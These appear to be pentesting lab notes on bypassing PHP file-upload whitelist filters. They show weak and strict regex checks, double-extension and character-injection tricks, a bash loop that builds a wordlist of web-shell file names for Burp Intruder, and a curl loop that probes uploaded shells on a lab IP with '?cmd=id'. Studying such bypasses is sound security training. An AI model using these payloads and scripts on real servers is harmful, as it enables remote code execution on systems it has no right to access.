Example of whitelist:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
- The issue is due to regex, it only checks whether the file name contains the extension and not if it actually ends with it

## Double Extensions
1. Create a file 'shell.jpg.php' (or instead of php, something the application accepts after fuzzing)

**Strict regex pattern
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
- This fixes the previous issue and check for the end extension

## Reverse Double Extension
1. Create a file 'shell.php.jpg' (or instead of php, something the application accepts after fuzzing)

## Character Injection
- %20
- %0a
- %00
- %0d0a
- /
- .\
- .
- '''
- :
These characters may end the file name after the character, passing the whitelist.

Bash script to generate all permutations of the file name:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
- With this, we can run Burp Intruder fuzzing

**Remember: uncheck URL Encode in Burp Intruder!!!!!

Bash script to check if php code was executed:
```bash
#!/bin/bash
#usage: supply your filename wordlist with the execution of this script. It replaces each line with $line 
#./repeat.sh wordlist.txt

input=$1
while IFS= read -r line
do
        echo 'doing' $line':'
        curl -I http://139.59.171.86:32638/profile_images/$line?cmd=id
done < "$input"
```
